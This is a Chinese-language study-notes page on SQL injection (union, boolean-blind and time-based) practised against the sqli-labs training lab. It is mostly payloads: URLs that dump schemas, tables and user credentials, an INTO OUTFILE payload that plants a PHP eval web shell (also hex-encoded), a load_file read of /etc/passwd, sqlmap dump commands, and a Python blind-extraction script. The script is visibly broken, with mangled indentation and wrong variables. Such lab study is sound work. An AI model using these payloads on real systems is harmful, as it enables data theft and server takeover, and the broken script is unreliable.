+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_005-1567178982004.jpg" alt="image"></p>
+<h2 id="2-联合注入、布尔盲注与延时注入">2 联合注入、布尔盲注与延时注入</h2>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_006-1567178982004.png" alt="image"></p>
+<p>联合注入：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_007-1567178982004.jpg" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#注入点</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; </span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#39; or &#39;1 </span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#x3D;1-- - </span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or &#39;1&#x3D;1--+</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; or 1&#x3D;1%23</span><br><span class="line"></span><br><span class="line">#判断字段数</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 3 -- - </span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4 -- -</span><br><span class="line"></span><br><span class="line">#数据库基本信息</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,database(),version() -- - http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,current_user(),user() -- -</span><br><span class="line"></span><br><span class="line">#数据库</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select  0,database(),group_concat(schema_name)from information_schema.schemata -- -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据表</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,database(),group_concat(table_name)from information_schema.tables where table_schema&#x3D;database() -- -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据列</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,database(),group_concat(column_name)from information_schema.columns where table_schema&#x3D;database() -- -</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,group_concat(username),group_concat(password)from users -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_010-1567178982004.jpg" alt="image"></p>
+<p>写文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select null,null,&#39;&lt;?php @eval($_POST[&#39;Rj45&#39;]);?&gt;&#39; into outfile &#39;&#x2F;tmp&#x2F;Rj45.php&#39; -- -</span><br><span class="line"></span><br><span class="line">#推荐进行十六进制编码</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select null,null,0x273C3F70687020406576616C28245F504F53545B27526A3435275D293B3F3E27 into outfile  &#39;&#x2F;tmp&#x2F;Rj45.php&#39; -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_012-1567178982004.jpg" alt="image"></p>
+<p>读文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-1&#x2F;?id&#x3D;0&#39; union select 0,load_file(&#39;&#39;&#x2F;tmp&#x2F;Rj45.php&#39;),load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)-- -</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_014-1567178982004.jpg" alt="image"></p>
+<p>布尔盲注：</p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_015-1567178982004.jpg" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">注入点同上</span><br><span class="line">#数据库基本信息</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(substr((database()),1,1))&#x3D;ascii(&#39;a&#39;)%23</span><br><span class="line"></span><br><span class="line">#数据库</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&#x3D;ascii(&#39;a&#39;) %23</span><br><span class="line"></span><br><span class="line">#数据表</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(substr((select table_name from information_schema.tables limit 0,1),1,1))&#x3D;ascii(&#39;a&#39;) where table_schema&#x3D;database %23</span><br><span class="line"></span><br><span class="line">#数据列</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(substr((select column_name from information_schema.columns limit 0,1),1,1))&#x3D;ascii(&#39;a&#39;) where table_schema&#x3D;database %23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#数据</span><br><span class="line">http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ord(substr((select username from users limit 0,1),1,1))&#x3D;ascii(&#39;a&#39;) %23</span><br><span class="line"></span><br><span class="line">#sqlmap：</span><br><span class="line">[sqlmap -u ](http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1)http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1 -p id --technique B --v 3 --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_018-1567178982004.jpg" alt="image"></p>
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">import requests,string,re,time</span><br><span class="line">def getDatabase(url,r):</span><br><span class="line">	database &#x3D; &#39;&#39;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for s in letters:</span><br><span class="line">			ur &#x3D; url+&quot;ord(substr((database()),&quot;+str(i)+&quot;,1))&#x3D;ascii(&#39;&quot;+s+&quot;&#39;)%23&quot;</span><br><span class="line">			print(ur)</span><br><span class="line">			res &#x3D; r.get(ur)</span><br><span class="line">			try:</span><br><span class="line">				res &#x3D; re.search(r&#39;You are in&#39;,res.text).group(0)</span><br><span class="line">				database +&#x3D;s</span><br><span class="line">			except:</span><br><span class="line">				pass</span><br><span class="line">		print(&#39;当前数据库为：&#39;+database)</span><br><span class="line">		</span><br><span class="line">def getDatabases(url,r):</span><br><span class="line">	databases &#x3D; &#39;&#39;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for j in range(0,5):</span><br><span class="line">			for s in letters:</span><br><span class="line">				ur &#x3D; url+&quot;ord(substr((select schema_name from information_schema.schemata limit</span><br><span class="line">&quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))&#x3D;ascii(&#39;&quot;+s+&quot;&#39;)%23&quot;</span><br><span class="line">				print(ur)</span><br><span class="line">				res &#x3D; r.get(ur)</span><br><span class="line">				try:</span><br><span class="line">					res &#x3D; re.search(r&#39;You are in&#39;,res.text).group(0)			</span><br><span class="line">					databases +&#x3D;s</span><br><span class="line">					time.sleep(3)</span><br><span class="line">				except:</span><br><span class="line">					pass</span><br><span class="line">    		print(&#39;所有数据库为：&#39;+databases)</span><br><span class="line">    </span><br><span class="line">def getTables(url,r):</span><br><span class="line">    tables &#x3D; &#39;&#39;</span><br><span class="line">        for i in range(1,10):</span><br><span class="line">            for j in range(0,5):</span><br><span class="line">            for s in letters:</span><br><span class="line">				ur &#x3D; url+&quot;ord(substr((select table_name from information_schema.tables limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))&#x3D;ascii(&#39;&quot;+s+&quot;&#39;) where table_schema&#x3D;database %23&quot;</span><br><span class="line">                print(ur)</span><br><span class="line">                res &#x3D; r.get(ur)</span><br><span class="line">                try:</span><br><span class="line">                    res &#x3D; re.search(r&#39;You are in&#39;,res.text).group(0)</span><br><span class="line">                    tables +&#x3D;s</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                except:</span><br><span class="line">               		 pass</span><br><span class="line">	print(&#39;当前数据库的所有数据表为：&#39;+tables)</span><br><span class="line">	</span><br><span class="line">def getColumns(url,r):</span><br><span class="line">    columns &#x3D; &#39;&#39;</span><br><span class="line">    	for i in range(1,10):</span><br><span class="line">    		for j in range(0,5):</span><br><span class="line">    			for s in letters:</span><br><span class="line">   					 ur &#x3D; url+&quot;ord(substr((select column_name from information_schema.columns limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))&#x3D;ascii(&#39;&quot;+s+&quot;&#39;) where table_schema&#x3D;database %23&quot;</span><br><span class="line">   				 print(ur)</span><br><span class="line">                res &#x3D; r.get(ur)</span><br><span class="line">                try:</span><br><span class="line">                    res &#x3D; re.search(r&#39;You are in&#39;,res.text).group(0)</span><br><span class="line">                    tables +&#x3D;s</span><br><span class="line">                    time.sleep(3)</span><br><span class="line">                except:</span><br><span class="line">                    pass</span><br><span class="line">    print(&#39;当前数据库的所有数据表的所有数据列为：&#39;+columns)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def getData(url,r):</span><br><span class="line">    data &#x3D; &#39;&#39;</span><br><span class="line">    for i in range(1,20):</span><br><span class="line">        for j in range(0,20):</span><br><span class="line">            for s in letters:</span><br><span class="line">				ur &#x3D; url+&quot;ord(substr((select username from users limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))&#x3D;ascii(&#39;&quot;+s+&quot;&#39;)%23&quot;</span><br><span class="line">			print(ur)</span><br><span class="line">            res &#x3D; r.get(ur)</span><br><span class="line">            try:</span><br><span class="line">                res &#x3D; re.search(r&#39;You are in&#39;,res.text).group(0)</span><br><span class="line">                data +&#x3D;s</span><br><span class="line">                time.sleep(3)</span><br><span class="line">            except:</span><br><span class="line">				pass				</span><br><span class="line">		print(&#39;数据：&#39;+data)</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    letters &#x3D; string.ascii_letters</span><br><span class="line">    url &#x3D; &quot;http:&#x2F;&#x2F;192.168.3.6&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and &quot;</span><br><span class="line">    r &#x3D; requests.Session()</span><br><span class="line">    getDatabase(url,r)</span><br><span class="line">    getDatabases(url,r)</span><br><span class="line">    getTables(url,r)</span><br><span class="line">    getTables(url,r)</span><br><span class="line">    getData(url,r)</span><br></pre></td></tr></table></figure>
+<p>延时注入：</p>
+<p><code>[sqlmap -u ](http://192.168.3.6/Less-5/?id=1)http://192.168.3.6/Less-5/?id=1 -p id --technique T --time-sec 5 --v 3 --dump</code></p>
+<p><img src="/01-%E4%BF%A1%E5%AE%89%E5%B0%8F%E7%99%BD%E8%AE%A1%E5%88%92/01-Web%E5%AE%89%E5%85%A8/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/004_%E7%AC%AC%E5%9B%9B%E5%91%A8%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%5CImage_023-1567178982004.jpg" alt="image"></p>
+<h1 id="参考">参考</h1>
+<p>1、BingSlient’s Blog</p>
+<p><a href="https://bingslient.github.io/2019/08/26/MySQL%20%E5%87%BD%E6%95%B0%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://bingslient.github.io/2019/08/26/MySQL 函数及其利用/</a></p>
+<p>2、soya’s blog</p>
+<p><a href="https://soyawww.github.io/2019/08/28/sql%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/" target="_blank" rel="noopener">https://soyawww.github.io/2019/08/28/sql基础学习（三）/</a></p>
+<p>3、<a href="https://www.cnblogs.com/dotnetcrazy/" target="_blank" rel="noopener">逸鹏说道</a>  <a href="https://www.cnblogs.com/dotnetcrazy/p/11406469.html" target="_blank" rel="noopener">信安周报-第04周：系统函数与UDF</a></p>
+<p>4、信安之路小白学习记录</p>
+<pre><code>第四周：数据库系统功能相关学习-Rj45-1424.pdf</code></pre>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
